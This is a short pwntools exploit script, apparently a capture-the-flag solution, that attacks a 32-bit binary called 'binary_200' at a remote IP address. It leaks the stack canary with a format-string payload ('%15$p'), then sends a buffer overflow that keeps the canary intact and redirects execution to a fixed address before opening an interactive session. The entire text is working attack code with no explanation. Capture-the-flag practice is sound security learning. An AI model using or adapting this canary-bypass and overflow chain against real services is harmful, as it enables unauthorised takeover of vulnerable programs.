from pwn import *
context.log_level='debug'
io=process('./binary_200')
io=remote('172.104.78.53',22002)
# elf=ELF('./binary_200')
pay='%15$p'
io.sendline(pay)
io.recv(2)
canary=int(io.recv(8),16)
pay='a'*0x28+p32(canary)+'a'*8+p32(0)+p32(0x0804854d)
io.sendline(pay)
io.interactive()